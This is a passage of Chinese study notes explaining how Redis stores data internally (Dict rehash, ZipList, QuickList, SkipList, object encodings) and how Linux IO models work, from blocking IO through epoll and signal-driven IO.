  ![image-20220702104743512](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ff206082930d2da5d1c75169c03f20f3-c00248c.png)

#### Dict添加键值对

当我们向Dict添加键值对时, Redis首先根据key计算出hash值(h), 然后利用 `h & sizemask`(相当于`h mod size`)来计算元素应该存储到数组中的哪个索引位置。

存储`k1=v1`，假设k1的哈希值h =1，则`1&3 =1`，因此`k1=v1`要存储到数组角标`1`位置。

![image-20220702104943218](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/55d2163867f7886cdbfa6f63fc661b3f-f41062d.png)

再次添加`k2=v2` , 使用头插法插入数据

![image-20220702105133894](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/681ff7fae8ff96472ffaee38e07fd651-89db125.png)

#### Dict完整结构

![image-20220702105304986](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ccbb30addfb6030347b1d512be252560-08e1949.png)

`type` 和 `privdata`为私有数据, `rehashidx` 和 `pauserehash` 供Rehash使用, 实际数据存储于`ht[2]`

`ht[1]` 用于存储数据, `ht[2]` 用于`rehash` 

#### Dict的扩容

Dict中的HashTable就是数组结合单向链表的实现，当集合中元素较多时，必然导致哈希冲突增多，链表过长，则查询效率会大大降低。

Dict在每次新增键值对时都会检查**负载因子**(`LoadFactor = used/size`), 满足以下两种情况时会触发**哈希表扩容**：

- 哈希表的 LoadFactor >= 1，并且服务器没有执行 `BGSAVE` 或者 `BGREWRITEAOF `等后台进程；

- 哈希表的 LoadFactor > 5 ；

![image-20220702142914108](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dae1baaa7e854df6a9369f6c9b091ceb-4864207.png)

#### Dict的收缩

Dict除了扩容以外，每次删除元素时，也会对负载因子做检查，当LoadFactor < 0.1 时，会做哈希表收缩：

![image-20220702143228068](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/22c0604f905c9a9320ed22fe6ca20ad4-7e2fbee.png)

![image-20220702143331778](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b5676912c64e4eddaed222a5d97d79ba-4cec64e.png)

![image-20220702143501558](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a012be5aa820a61ebafb64e05846231c-a7e09fe.png)

#### Dict的rehash

不管是扩容还是收缩，必定会创建新的哈希表，导致哈希表的size和sizemask变化，而key的查询与sizemask有关。因此必须对哈希表中的每一个key重新计算索引，插入新的哈希表，这个过程称为**rehash**。

![158955482123522445622131](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a6443c22addef2e2cd0a6001a877bc94-9a3e055.gif)

①计算新hash表的size，值取决于当前要做的是扩容还是收缩：

- 如果是扩容，则新size为第一个大于等于`dict.ht[0].used + 1`的2^n

- 如果是收缩，则新size为第一个大于等于`dict.ht[0].used`的2^n （不得小于4）

②按照新的size申请内存空间，创建`dictht`，并赋值给`dict.ht[1]` 

③设置`dict.rehashidx = 0`，标示开始rehash

~~④将`dict.ht[0]`中的每一个dictEntry都rehash到`dict.ht[1]`~~ 

```
Dict的rehash并不是一次性完成的。
如果Dict中包含数百万的entry，要在一次rehash完成，极有可能导致主线程阻塞。
因此Dict的rehash是分多次、渐进式的完成，因此称为渐进式rehash。
```

④每次执行新增、查询、修改、删除操作时，都检查一下`dict.rehashidx`是否大于-1，如果是则将`dict.ht[0].table[rehashidx]`的entry链表rehash到`dict.ht[1]`，并且将`rehashidx++`。直至`dict.ht[0]`的所有数据都rehash到`dict.ht[1]`

⑤将`dict.ht[1]`赋值给`dict.ht[0]`，给`dict.ht[1]`初始化为空哈希表，释放原来的`dict.ht[0]`的内存

⑥将`rehashidx`赋值为`-1`，代表rehash结束

⑦在rehash过程中，新增操作，则直接写入`ht[1]`，查询、修改和删除则会在`dict.ht[0]`和`dict.ht[1]`依次查找并执行。这样可以确保`ht[0]`的数据只减不增，随着rehash最终为空

#### 总结

Dict的结构：

- 类似HashTable，底层是数组加链表来解决哈希冲突

- Dict包含两个哈希表，`ht[0]`平常用，`ht[1]`用来rehash

Dict的伸缩：

- 当LoadFactor大于5或者LoadFactor大于1并且没有子进程任务时，Dict扩容

- 当LoadFactor小于0.1时，Dict收缩

- 扩容大小为第一个大于等于used + 1的2^n

- 收缩大小为第一个大于等于used 的2^n

- Dict采用渐进式rehash，每次访问Dict时执行一次rehash

- rehash时ht[0]只减不增，新增操作只在ht[1]执行，其它操作在两个哈希表

> 内存不连续, 内存浪费

### ZipList

#### ZipList简介

**ZipList** 是一种特殊的“双端链表” ，由一系列特殊编码的连续内存块组成。可以在任意一端进行压入/弹出操作, 并且该操作的时间复杂度为 O(1)。具体的数据结构如下所示:

![image-20220703085252637](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5ee52eb9d9b91437973c0a5588d0e991-9a2f4a5.png)

| 属性    | 类型     | 长度   | 用途                                                         |
| ------- | -------- | ------ | ------------------------------------------------------------ |
| zlbytes | uint32_t | 4 字节 | 记录整个压缩列表占用的内存字节数                             |
| zltail  | uint32_t | 4 字节 | 记录压缩列表表尾节点距离压缩列表的起始地址有多少字节，<br />通过这个偏移量，可以确定表尾节点的地址。 |
| zllen   | uint16_t | 2 字节 | 记录了压缩列表包含的节点数量。 最大值为UINT16_MAX （65534），<br />如果超过这个值，此处会记录为65535，<br />但节点的真实数量需要遍历整个压缩列表才能计算得出。 |
| entry   | 列表节点 | 不定   | 压缩列表包含的各个节点，节点的长度由节点保存的内容决定。     |
| zlend   | uint8_t  | 1 字节 | 特殊值 `0xFF `（十进制 255 ），用于标记压缩列表的末端。      |

#### ZipListEntry

**ZipList** 中的Entry并不像普通链表那样记录前后节点的指针，因为记录两个指针要占用16个字节，浪费内存。而是采用了下面的结构：

![image-20220703085748538](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/02301de3782a5593f91715f65e798123-e33658f.png)

- previous_entry_length：前一节点的长度，占1个或5个字节。
  - 如果前一节点的长度小于254字节，则采用1个字节来保存这个长度值
  - 如果前一节点的长度大于254字节，则采用5个字节来保存这个长度值，第一个字节为`0xfe`，后四个字节才是真实长度数据

- encoding：编码属性，记录content的数据类型（字符串还是整数）以及长度，占用1个、2个或5个字节

- contents：负责保存节点的数据，可以是字符串或整数

> ZipList中所有存储长度的数值均采用小端字节序，即低位字节在前，高位字节在后。例如：数值`0x1234`，采用小端字节序后实际存储值为：`0x3412`
>
> [[理解字节序 大端字节序和小端字节序](https://www.cnblogs.com/gremount/p/8830707.html)]

##### Encoding编码

ZipListEntry中的encoding编码分为字符串和整数两种：

- 字符串：如果encoding是以“00”、“01”或者“10”开头，则证明content是字符串

  |                         编码                         | 编码长度 | 字符串大小           |
  | :--------------------------------------------------: | :------: | -------------------- |
  |                     \|00pppppp\|                     | 1  bytes | <=  63 bytes         |
  |                \|01pppppp\|qqqqqqqq\|                | 2  bytes | <=  16383 bytes      |
  | \|10000000\|qqqqqqqq\|rrrrrrrr\|ssssssss\|tttttttt\| | 5  bytes | <=  4294967295 bytes |

  例如，我们要保存字符串：“ab”和 “bc”, 储存结构为: 

  ![image-20220703090501059](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/de01b2eced959d2faf0e56b0e7b7e3db-857cbe0.png)

- 整数：如果encoding是以“11”开始，则证明content是整数，且encoding固定只占用1个字节

  |   编码   | 编码长度 | 整数类型                                                     |
  | :------: | :------: | ------------------------------------------------------------ |
  | 11000000 |    1     | int16_t（2  bytes）                                          |
  | 11010000 |    1     | int32_t（4  bytes）                                          |
  | 11100000 |    1     | int64_t（8  bytes）                                          |
  | 11110000 |    1     | 24位有符整数(3 bytes)                                        |
  | 11111110 |    1     | 8位有符整数(1 bytes)                                         |
  | 1111xxxx |    1     | 直接在xxxx位置保存数值, 范围从0001~1101, 减1后结果为实际值, 即0~12 |

  例如，一个ZipList中包含两个整数值：“2”和“5”

  ![image-20220703090900521](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f385696f7af49d7d18de157325da5f70-1007903.png)

#### ZipList的连锁更新问题

ZipList的每个Entry都包含`previous_entry_length`来记录上一个节点的大小，长度是1个或5个字节：

- 如果前一节点的长度小于254字节，则采用1个字节来保存这个长度值

- 如果前一节点的长度大于等于254字节，则采用5个字节来保存这个长度值，第一个字节为0xfe，后四个字节才是真实长度数据

假设存在有N个连续的、长度为250~253字节之间的entry，因此entry的`previous_entry_length`属性用1个字节即可表示，如果在队首添加一个大于等于254字节的元素, 如图所示：

![12332455703091933089823211](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7cd6aa7894635b14a84422f70c39c04b-de40245.gif)

ZipList这种特殊情况下产生的连续多次空间扩展操作称之为**连锁更新（Cascade Update）**。新增、删除都可能导致连锁更新的发生。

#### 总结

ZipList特性：

①压缩列表的可以看做一种连续内存空间的"双向链表"

②列表的节点之间不是通过指针连接，而是记录上一节点和本节点长度来寻址，内存占用较低

③如果列表数据过多，导致链表过长，可能影响查询性能, 所以长度有限制

④增或删较大数据时有可能发生连续更新问题

### QuickList

#### QuickList引入

ZipList虽然节省内存，但申请内存必须是连续空间，如果内存占用较多，申请内存效率很低。为了缓解这个问题，我们必须限制ZipList的长度和entry大小。

但是要存储大量数据，超出了ZipList最佳的上限, 可以创建多个ZipList来分片存储数据。

数据拆分后比较分散，不方便管理和查找，这多个ZipList如何建立联系？Redis在3.2版本引入了新的数据结构**QuickList**，它是一个双端链表，只不过链表中的每个节点都是一个ZipList。

![image-20220703093654762](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/cb71923492cc0e2879e8b79e9e76a946-1e56300.png)

#### ZipList节点控制

为了避免QuickList中的每个ZipList中entry过多，Redis提供了一个配置项：`list-max-ziplist-size`来限制。

- 如果值为正，则代表ZipList的允许的**entry个数**的最大值

- 如果值为负，则代表ZipList的**最大内存**大小，分5种情况：

  ```
  -1：每个ZipList的内存占用不能超过4kb
  -2：每个ZipList的内存占用不能超过8kb
  -3：每个ZipList的内存占用不能超过16kb
  -4：每个ZipList的内存占用不能超过32kb
  -5：每个ZipList的内存占用不能超过64kb
  其默认值为 -2：
  ```

  ![image-20220703093837954](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f7e80ed1a3702650e04a690fb08450a1-6257078.png)

除了控制ZipList的大小，QuickList还可以对节点的ZipList做压缩。通过配置项`list-compress-depth`来控制。因为链表一般都是从首尾访问较多，所以首尾是不压缩的。这个参数是控制首尾不压缩的节点个数：

```
0：特殊值，代表不压缩
1：标示QuickList的首尾各有1个节点不压缩，中间节点压缩
2：标示QuickList的首尾各有2个节点不压缩，中间节点压缩
其默认值为 0
以此类推
```

![image-20220703093958090](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8b648382d193b59dc1f1b3638d755f2e-4c5ddb2.png)

#### 底层实现

![image-20220703094248775](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/476e4b74386df29d93868ab0263195e1-fdc5df2.png)

![image-20220703094428304](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bc7b1e49e6cfe5d0c512f47277aeb435-faa07df.png)

#### QuickList数据结构

![image-20220703094456586](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2d0b96b94f091cc0e1f580d2f4a053d5-307ef23.png)

### SkipList

#### SkipList简介

**SkipList（跳表）**首先是链表，但与传统链表相比有几点差异：

- 元素按照升序排列存储

- 节点可能包含多个指针，指针跨度不同。

对比ZipList和QuickList, 查询中间节点数据性能较好, 不用逐个遍历元素

![image-20220703100231514](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/69ae08821256e681ffd04819f7d7fd4d-ed02b0c.png)

#### 数据结构

![image-20220703100618827](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f4a0b6ea384f2e5660d6c3400947d8d0-9bf376b.png)

![image-20220703100729681](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8def98475926e2de06c6df26e3ed7ddb-636bdc7.png)

#### 总结

SkipList的特点：

- 跳跃表是一个双向链表，每个节点都包含score和ele值

- 节点按照score值排序，score值一样则按照ele字典排序

- 每个节点都可以包含多层指针，层数是**1到32**之间的随机数

- 不同层指针到下一个节点的跨度不同，层级越高，跨度越大

- 增删改查效率与红黑树基本一致，实现却更简单

### RedisObject

Redis中的任意数据类型的键和值都会被封装为一个RedisObject，也叫做Redis对象，源码如下：

![image-20220703102753661](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/af40a3d93a91631f4708f847334c937c-18f8955.png)

Redis中会根据存储的数据类型不同，选择不同的编码方式，共包含11种不同类型：

| 编号 | 编码方式                | 说明                   |
| :--: | ----------------------- | ---------------------- |
|  0   | OBJ_ENCODING_RAW        | raw编码动态字符串      |
|  1   | OBJ_ENCODING_INT        | long类型的整数的字符串 |
|  2   | OBJ_ENCODING_HT         | hash表（字典dict）     |
|  3   | OBJ_ENCODING_ZIPMAP     | 已废弃                 |
|  4   | OBJ_ENCODING_LINKEDLIST | 双端链表               |
|  5   | OBJ_ENCODING_ZIPLIST    | 压缩列表               |
|  6   | OBJ_ENCODING_INTSET     | 整数集合               |
|  7   | OBJ_ENCODING_SKIPLIST   | 跳表                   |
|  8   | OBJ_ENCODING_EMBSTR     | embstr的动态字符串     |
|  9   | OBJ_ENCODING_QUICKLIST  | 快速列表               |
|  10  | OBJ_ENCODING_STREAM     | Stream流               |

Redis中会根据存储的数据类型不同，选择不同的编码方式。每种数据类型的使用的编码方式如下：

|  数据类型  | 编码方式                                           |
| :--------: | -------------------------------------------------- |
| OBJ_STRING | int、embstr、raw                                   |
|  OBJ_LIST  | LinkedList和ZipList(3.2以前)、QuickList（3.2以后） |
|  OBJ_SET   | intset、HT                                         |
|  OBJ_ZSET  | ZipList、HT、SkipList                              |
|  OBJ_HASH  | ZipList、HT                                        |

### 五种数据结构

#### String

String是Redis中最常见的数据存储类型：

- 其基本编码方式是**RAW**，基于**简单动态字符串（SDS）**实现，存储上限为512mb。

  ![image-20220703110216960](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e704f0768e2dac979cfae3e5410b8703-1deb05d.png)

- 如果存储的SDS长度小于44字节，则会采用**EMBSTR**编码，此时object head与SDS是一段连续空间。申请内存时只需要调用一次内存分配函数，效率更高。

  ![image-20220703110236364](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4931ae3a6ffba9db55d886a7495dd155-bffe22d.png)

- 如果存储的字符串是整数值，并且大小在`LONG_MAX`范围内，则会采用**INT**编码：直接将数据保存在RedisObject的ptr指针位置（刚好8字节），不再需要SDS了。

  ![image-20220703110258535](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c28a446d5bd4fbc14ae867c44e8babaa-bde6d3a.png)

![image-20220703110548121](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4b88d039e0e4f66060bff62f09285fdf-de513b4.png)

> 使用字符串格式数据时, 按照节省内存的逻辑, 尽量使用优先数字(int编码格式), 其次优先使用小于45个字符的字符串(embstr编码格式), 不推荐使用大字符串保存数据, 可能造成BigKey

#### List

Redis的List类型可以从首、尾操作列表中的元素, 满足该特征的数据结构有三种:

- **LinkedList** ：普通链表，可以从双端访问，内存占用较高，内存碎片较多

- **ZipList** ：压缩列表，可以从双端访问，连续内存空间, 内存占用低，存储上限低

- **QuickList**：LinkedList + ZipList，可以从双端访问，内存占用较低，包含多个ZipList，存储上限高

在3.2版本之前，Redis采用**ZipList**和**LinkedList**来实现List，当元素数量小于512并且元素大小小于64字节时采用ZipList编码，超过则采用LinkedList编码。

在3.2版本之后，Redis统一采用**QuickList**来实现List：

![image-20220703112919765](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9378b10899e23356eff2fac34c79deb1-2b85d7f.png)

![image-20220703112936331](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d8b248a19ca10063ba9be12dce9b6a90-6948607.png)

内存图:

![image-20220703113020320](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/46bcf52e1c0fb159c954be2faec70f7f-876abcf.png)

#### Set

Set是Redis中的单列集合，满足下列特点：

- 不保证有序性

- 保证元素唯一 (可以判断元素是否存在)

- 求交集、并集、差集

可以看出，Set对查询元素的效率要求非常高, 使用HashTable可以满足以上需求, 也就是Redis中的Dict，不过Dict是双列集合（可以存键、值对）

Set是Redis中的集合，不一定确保元素有序，可以满足元素唯一、查询效率要求极高。

- 为了查询效率和唯一性，set采用HT编码（**Dict**）。Dict中的key用来存储元素，value统一为null。

- 当存储的所有数据都是整数，并且元素数量不超过`set-max-intset-entries`(默认值是512)时，Set会采用**IntSet**编码，以节省内存。

**代码实现** 

创建:

![image-20220703133521825](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/067741ed45b3559bfc1aae0c55a4ea71-e2ba790.png)

添加元素

![image-20220703133825524](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2718ee01e1cd5d9b7801592dfbc91bb6-7e99597.png)

![image-20220703134722184](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/fff5e4813c4de4b4adea56d9d1c8e060-314286f.png)

**内存图**

![image-20220703140602215](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2190502fe238d4d21ca30bce958b24b1-b9ec829.png)

添加新数据变动:

![1232344220703134230324430](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c146938cec76c6f3e4d47a892d34fb02-41c3ff7.gif)

#### Zset

ZSet也就是SortedSet，其中每一个元素都需要指定一个score值和member值, 需要实现：

- 可以根据score值排序后

- member必须唯一

- 可以根据member查询分数

因此，zset底层数据结构必须满足**键值存储、键必须唯一、可排序**这几个需求。其中编码结构可以满足需求的有:

- **SkipList**：可以排序，并且可以同时存储score和ele值（member）

- **HT（Dict）**：可以键值存储，并且可以根据key找value

**代码实现** 

**创建:**

![image-20220703141350789](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a5d0d2b84b53dc6b6ab6cb4fad2403ff-81a309d.png)

**少量元素优化:** 

当元素数量不多时，**HT**和**SkipList**的优势不明显，而且更耗内存。因此zset还会采用仅**ZipList**结构来节省内存，不过需要同时满足两个条件：

①元素数量小于`zset_max_ziplist_entries`，默认值128

②每个元素都小于`zset_max_ziplist_value`字节，默认值64

![image-20220703142327034](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/649abd10205ff31bc3be4bb6c4e2175b-73d922e.png)

**添加元素**:

![image-20220703143032001](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/65825a12764b966245c57528acd27dbe-2eaefc9.png)

**排序实现**

ziplist本身没有排序功能，而且没有键值对的概念，因此需要有zset通过编码实现：

- ZipList是连续内存，因此score和element是紧挨在一起的两个entry， element在前，score在后

- score越小越接近队首，score越大越接近队尾，按照score值升序排列

![image-20220703143222838](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ad91ac65b51c40c3e29b843f530ee250-d4db508.png)

#### Hash

Hash结构与Redis中的Zset非常类似：

- 都是键值存储

- 都需求根据键获取值

- 键必须唯一

区别如下：

- zset的键是member，值是score；hash的键和值都是任意值

- zset要根据score排序；hash则无需排序



因此，Hash底层采用的编码与Zset也基本一致，只需要把排序有关的SkipList去掉即可：

- Hash结构默认采用**ZipList**编码，用以节省内存。 ZipList中相邻的两个entry 分别保存field和value

- 当数据量较大时，Hash结构会转为HT编码，也就是**Dict**，触发条件有两个：

  ① ZipList中的元素数量超过了`hash-max-ziplist-entries`（默认512）

  ② ZipList中的任意entry大小超过了`hash-max-ziplist-value`（默认64字节）

![image-20220703150630161](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b1f7a62d64998a685ab4025e720db318-38bce94.png)

**代码实现:** 

![image-20220703152600746](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4bec58fe8aa3945105fd103c148a510e-15389ea.png)



## 网络模型

### 用户空间和内核空间

任何Linux发行版，其系统内核都是Linux。我们的应用都需要通过Linux内核与硬件交互。

![image-20220704124243506](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/65f59d50376d351ecb8141d4fdeb2755-914caf5.png)

为了避免用户应用导致冲突甚至内核崩溃，用户应用与内核是分离的：

- 进程的寻址空间会划分为两部分：**内核空间、用户空间**

- **用户空间**只能执行受限的命令（Ring3），而且不能直接调用系统资源，必须通过内核提供的接口来访问

- **内核空间**可以执行特权命令（Ring0），调用一切系统资源

![image-20220704124448883](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ac8294568531ac2d8e28bf47d4939464-00e144d.png)

Linux系统为了提高IO效率，会在用户空间和内核空间都加入缓冲区：

- 写数据时，要把用户缓冲数据拷贝到内核缓冲区，然后写入设备

- 读数据时，要从设备读取数据到内核缓冲区，然后拷贝到用户缓冲区

![image-20220704124828298](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5c079def535c550a9f57981483f4252f-bf99d8f.png)

### 五种IO模型

在《UNIX网络编程》一书中，总结归纳了5种IO模型：

- 阻塞IO（Blocking IO）

- 非阻塞IO（Nonblocking IO）

- IO多路复用（IO Multiplexing）

- 信号驱动IO（Signal Driven IO）

- 异步IO（Asynchronous IO）

![image-20220704124731196](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/cceff6a61c012e38294d678b3c331ca3-3086a5b.png)

#### 阻塞IO

顾名思义，阻塞IO就是两个阶段都必须阻塞等待：

![image-20220704125002627](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/712b6cbfe9c96f69c82db5fd24cab043-c51c92c.png)

**阶段一：**

- ①用户进程尝试读取数据（比如网卡数据）

- ②此时数据尚未到达，内核需要等待数据

- ③此时用户进程也处于阻塞状态

**阶段二：**

- ①数据到达并拷贝到内核缓冲区，代表已就绪

- ②将内核数据拷贝到用户缓冲区

- ③拷贝过程中，用户进程依然阻塞等待

- ④拷贝完成，用户进程解除阻塞，处理数据

可以看到，阻塞IO模型中，用户进程在两个阶段都是阻塞状态。

#### 非阻塞IO

顾名思义，非阻塞IO的`recvfrom`操作会立即返回结果而不是阻塞用户进程。

![image-20220704125144758](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/46600170012e52066d83d982a07d946f-49e5bbc.png)

**阶段一：**

- ①用户进程尝试读取数据（比如网卡数据）

- ②此时数据尚未到达，内核需要等待数据

- ③返回异常给用户进程

- ④用户进程拿到error后，再次尝试读取

- ⑤循环往复，直到数据就绪

**阶段二：**

- ①将内核数据拷贝到用户缓冲区

- ②拷贝过程中，用户进程依然阻塞等待

- ③拷贝完成，用户进程解除阻塞，处理数据

可以看到，非阻塞IO模型中，用户进程在第一个阶段是非阻塞，第二个阶段是阻塞状态。虽然是非阻塞，但性能并没有得到提高。而且忙等机制会导致CPU空转，CPU使用率暴增。

#### IO多路复用

无论是阻塞IO还是非阻塞IO，用户应用在一阶段都需要调用`recvfrom`来获取数据，差别在于无数据时的处理方案：

- 如果调用`recvfrom`时，恰好**没有**数据，阻塞IO会使CPU阻塞，非阻塞IO使CPU空转，都不能充分发挥CPU的作用。

- 如果调用`recvfrom`时，恰好**有**数据，则用户进程可以直接进入第二阶段，读取并处理数据

而在单线程情况下，只能依次处理IO事件，如果正在处理的IO事件恰好未就绪（数据不可读或不可写），线程就会被阻塞，所有IO事件都必须等待，性能自然会很差。

```
就比如服务员给顾客点餐，分两步：
 ①顾客思考要吃什么（等待数据就绪）
 ②顾客想好了，开始点餐（读取数据）

要提高效率有几种办法？
- 方案一：增加更多服务员（多线程）
- 方案二：不排队，谁想好了吃什么（数据就绪了），服务员就给谁点餐（用户应用就去读取数据）

那么问题来了：用户进程如何知道内核中数据是否就绪呢？
```

**文件描述符**（File Descriptor）：简称FD，是一个从0 开始的无符号整数，用来关联Linux中的一个文件。在Linux中，一切皆文件，例如常规文件、视频、硬件设备等，当然也包括网络套接字（Socket）。

**IO多路复用**：是利用单个线程来同时监听多个FD，并在某个FD可读、可写时得到通知，从而避免无效的等待，充分利用CPU资源。

![image-20220704125458059](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7d6d2153a1d9776379b8c1db245fdf1c-6721eff.png)

**阶段一：**

- ①用户进程调用select，指定要监听的FD集合

- ②内核监听FD对应的多个socket

- ③任意一个或多个socket数据就绪则返回readable

- ④此过程中用户进程阻塞

**阶段二：**

- ①用户进程找到就绪的socket

- ②依次调用`recvfrom`读取数据

- ③内核将数据拷贝到用户空间

- ④用户进程处理数据

```
IO多路复用是利用单个线程来同时监听多个FD，不过监听FD的方式、通知的方式又有多种实现，常见的有：
- select
- poll
- epoll

差异：
select和poll只会通知用户进程有FD就绪，但不确定具体是哪个FD，需要用户进程逐个遍历FD来确认
epoll则会在通知用户进程FD就绪的同时，把已就绪的FD写入用户空间
```

##### IO多路复用-select

**select**是Linux最早的I/O多路复用技术：

![image-20220704131319638](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0d0f72f07780ecb47b052d72f5a69353-b1fea25.png)

![53432341123210704130219 00_](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ab0e67f006519d322587e0c6dd0b6fd9-c31e492.gif)

**select模式存在的问题**：

- 需要将整个`fd_set`从用户空间拷贝到内核空间，`select`结束还要再次拷贝回用户空间

- `select`无法得知具体是哪个`fd`就绪，需要遍历整个`fd_set`

- `fd_set`监听的`fd`数量不能超过1024

##### IO多路复用-poll

**poll**模式对select模式做了简单改进，但性能提升不明显，部分关键代码如下：

![image-20220704131935087](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3f20355ccc9adb18249ad45aa9679911-89fec95.png)

**IO流程**：

- ①创建`pollfd`数组，向其中添加关注的`fd`信息，数组大小自定义

- ②调用`poll`函数，将`pollfd`数组拷贝到内核空间，转链表存储，无上限

- ③内核遍历`fd`，判断是否就绪

- ④数据就绪或超时后，拷贝`pollfd`数组到用户空间，返回就绪`fd`数量`n`

- ⑤用户进程判断`n`是否大于0

- ⑥大于0则遍历`pollfd`数组，找到就绪的`fd`

**与select对比**：

- select模式中的`fd_set`大小固定为1024，而`pollfd在`内核中采用**链表**，理论上无上限

- 监听FD越多，每次遍历消耗时间也越久，性能反而会下降

##### IO多路复用-epoll

epoll模式是对select和poll的改进，它提供了三个函数：

![image-20220704132641292](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a636c9f70d884c8888f893d261bc0a14-a9acef8.png)

![867645456704132748 00_0](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4d9a51361d722d8920d8e6e40880b3e2-6609e5b.gif)



```
select模式存在的三个问题：
 - 能监听的FD最大不超过1024
 - 每次select都需要把所有要监听的FD都拷贝到内核空间
 - 每次都要遍历所有FD来判断就绪状态
poll模式的问题：
 - poll利用链表解决了select中监听FD上限的问题，但依然要遍历所有FD，如果监听较多，性能会下降
epoll模式中如何解决这些问题的？
 - 基于epoll实例中的红黑树保存要监听的FD，理论上无上限，而且增删改查效率都非常高
 - 每个FD只需要执行一次epoll_ctl添加到红黑树，以后每次epol_wait无需传递任何参数，无需重复拷贝FD到内核空间
 - 利用ep_poll_callback机制来监听FD状态，无需遍历所有FD，因此性能不会随监听的FD数量增多而下降
```

##### IO多路复用-事件通知机制

当FD有数据可读时，我们调用`epoll_wait`（或者`select`、`poll`）可以得到通知。但是事件通知的模式有两种：

- **LevelTriggered**：简称**LT**，也叫做**水平触发**。只要某个`FD`中有数据可读，每次调用`epoll_wait`都会得到通知。

- **EdgeTriggered**：简称**ET**，也叫做**边沿触发**。只有在某个`FD`有状态变化时，调用`epoll_wait`才会被通知。

举个例子：

①假设一个客户端`socket`对应的`FD`已经注册到了`epoll`实例中

②客户端`socket`发送了2kb的数据

③服务端调用`epoll_wait`，得到通知说`FD`就绪

④服务端从`FD`读取了1kb数据

⑤回到步骤3（再次调用`epoll_wait`，形成循环）

结果：

- 如果采用LT模式，因为`FD`中仍有1kb数据，则第⑤步依然会返回结果，并且得到通知

- 如果采用ET模式，因为第③步已经消费了`FD`可读事件，第⑤步`FD`状态没有变化，因此`epoll_wait`不会返回，数据无法读取，客户端响应超时。

结论:

- LT：事件通知频率较高，会有重复通知，影响性能

- ET：仅通知一次，效率高。可以基于非阻塞IO循环读取解决数据读取不完整问题

>  select和poll仅支持LT模式，epoll可以自由选择LT和ET两种模式

##### IO多路复用-web服务流程

基于epoll模式的web服务的基本流程如图：

![image-20220704133537920](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/233fd3a83713fc6d2c9097c95bb39082-16e1354.png)

#### 信号驱动IO

**信号驱动IO**是与内核建立`SIGIO`的信号关联并设置回调，当内核有`FD`就绪时，会发出`SIGIO`信号通知用户，期间用户应用可以执行其它业务，无需阻塞等待。

![image-20220704133804934](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1aac4dfd1b8280c09d7b62b4df4b0fa4-0b5eab5.png)

阶段一：

- ①用户进程调用`sigaction`，注册信号处理函数

- ②内核返回成功，开始监听`FD`

- ③用户进程不阻塞等待，可以执行其它业务

- ④当内核数据就绪后，回调用户进程的`SIGIO`处理函数

阶段二：

- ①收到`SIGIO`回调信号

- ②调用`recvfrom`，读取

- ③内核将数据拷贝到用户空间

- ④用户进程处理数据

> 当有大量IO操作时，信号较多，SIGIO处理函数不能及时处理可能导致信号队列溢出，而且内核空间与用户空间的频繁信号交互性能也较低。

#### 异步IO

**异步IO**的整个过程都是非阻塞的，用户进程调用完异步API后就可以去做其它事情，内核等待数据**就绪并拷贝到用户空间后**才会递交信号，通知用户进程。

![image-20220704134003847](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/23158e23e7db717eb48231268ce784f9-f813eb0.png)

阶段一：

